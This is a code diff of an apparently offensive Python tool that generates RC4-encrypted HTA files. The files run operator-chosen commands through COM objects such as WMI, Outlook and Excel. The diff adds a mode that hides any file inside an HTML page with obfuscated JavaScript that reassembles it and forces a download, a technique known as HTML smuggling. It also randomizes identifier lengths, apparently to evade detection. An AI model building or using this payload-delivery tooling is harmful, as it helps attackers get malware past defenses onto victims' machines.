@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python2
 # -*- coding: utf-8 -*-
 
 from __future__ import print_function
@@ -13,6 +13,9 @@ import sys
 # TODO: load *all* templates from template folder rather than hard-coding
 with open("templates/hta_template.txt") as f:
 	HTML_TEMPLATE = f.read()
+
+with open("templates/file_template.txt") as f:
+	FILE_TEMPLATE = f.read()
 
 
 WMI_HTA = """<html>
@@ -72,7 +75,8 @@ PAYLOAD_OPTIONS = {
 	"WbemScripting.SWbemLocator": WMI_HTA,
 	"Outlook.Application": OUTLOOK_HTA,
 	"Excel.RegisterXLL": XLL_HTA,
-	"ShellBrowserWindow": SHELLBROWSER_HTA
+	"ShellBrowserWindow": SHELLBROWSER_HTA,
+	"PlainFile": ""
 }
 
 
@@ -95,7 +99,7 @@ def rc4(key, data):
 
 
 def rnd():
-	return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(8))
+	return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(random.randrange(4,12)))
 
 
 def payload_choices():
@@ -113,6 +117,7 @@ if __name__ == '__main__':
 	parser.add_argument("-p", "--payload", help="Payload type to use", dest="payload", choices=payload_choices())
 	parser.add_argument("-l", "--list-payloads", help="List payloads available", action="store_const", const="list_payloads")
 	parser.add_argument("-c", "--command", help="Command to run from HTA", dest="command")
+	parser.add_argument("-f", "--file", help="File to drop, when used with payload PlainFile", dest="dropfile")
 	parser.add_argument("-o", "--output", help="Name of the HTA file to generate", dest="output")
 	args = parser.parse_args()
 
@@ -121,7 +126,28 @@ if __name__ == '__main__':
 		list_payloads()
 		sys.exit(1)
 
-	if args.key and args.command and args.output and args.payload:
+	if args.payload == "PlainFile" and args.key and args.dropfile:
+		with open(args.dropfile, 'r') as f:
+			hta_encrypted = base64.b64encode(rc4(args.key, base64.b64encode(f.read())))
+			filename_encrypted = base64.b64encode(rc4(args.key, args.dropfile.split(os.sep)[-1]))
+
+
+		blobber = """(function(b,fname){if(navigator.msSaveBlob)navigator.msSaveBlob(b,fname);else{var link=document.createElement("a");link.href=window.URL.createObjectURL(b),link.setAttribute("download",fname),document.body.appendChild(link),link.click(),document.body.removeChild(link)}})"""
+
+		b64tobin = """(function(t){for(var e=atob(t),n=e.length,r=Math.ceil(n/1024),a=new Array(r),o=0;o<r;++o){for(var c=1024*o,i=Math.min(c+1024,n),y=new Array(i-c),l=c,p=0;l<i;++p,++l)y[p]=e[l].charCodeAt(0);a[o]=new Uint8Array(y)}return new Blob(a,{type:'application/octet-stream'})})"""
+
+		msSaveBlob = base64.b64encode(rc4(args.key, blobber))
+		blob = base64.b64encode(rc4(args.key, "Blob"))
+		b64func = base64.b64encode(rc4(args.key, b64tobin))
+
+		outfile = "{}.html".format(os.path.splitext(args.dropfile.split(os.sep)[-1])[0])
+		with open(outfile, 'w') as f:
+			f.write(FILE_TEMPLATE.format(rnd(), rnd(), hta_encrypted, rnd(), filename_encrypted, rnd(), args.key, msSaveBlob, rnd(), rnd(), blob, rnd(), b64func))
+		print("\n[*] Generating with key: {}".format(args.key))
+		print("[*] Will drop: {}".format(args.dropfile))
+		print("[+] HTA file written to: {}".format(outfile))
+
+	elif args.key and args.command and args.output and args.payload:
 		hta_text = PAYLOAD_OPTIONS.get(args.payload).format(args.command, rand=rnd())
 		hta_encrypted = base64.b64encode(rc4(args.key, hta_text))
 		filename_encrypted = base64.b64encode(rc4(args.key, args.output))
